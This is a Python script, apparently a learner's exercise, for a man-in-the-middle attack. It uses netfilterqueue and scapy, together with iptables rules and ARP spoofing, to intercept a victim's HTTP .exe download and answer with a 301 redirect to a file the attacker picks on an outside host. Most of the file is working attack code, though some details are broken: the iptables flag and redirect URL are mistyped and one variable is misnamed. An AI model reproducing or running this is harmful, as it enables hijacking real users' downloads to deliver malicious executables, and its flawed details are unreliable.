#!/usr/bin/env python

# This script replaces the downloading .exe with the file in hacker machine

# Run from the Linux machine with netfilterqueue python module
# Run the linux command first to capture local input and output traffic -
# iptables -I INPUT -j NFQUEUE ---queue-num 0
# iptables -I OUTPUT -j NFQUEUE ---queue-num 0
# Run the linux command if the target is a remote machine
# iptables -I FORWARD -j NFQUEUE ---queue-num 0
# Also run the arp_spoof.py for remote machine
# When done, run - iptables --flush

import netfilterqueue
import scapy.all as scapy

ack_list =[]

def set_load(packet, load):
    # Optional func
    pass

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport ==80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
            # print("HTTP Request")
            # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www/rarlab.com/rar/wrar56b1.exe\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy.packet))
            # print("HTTP Response")
            # print(scapy_packet.show())


    packet.accept()

queue =  netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

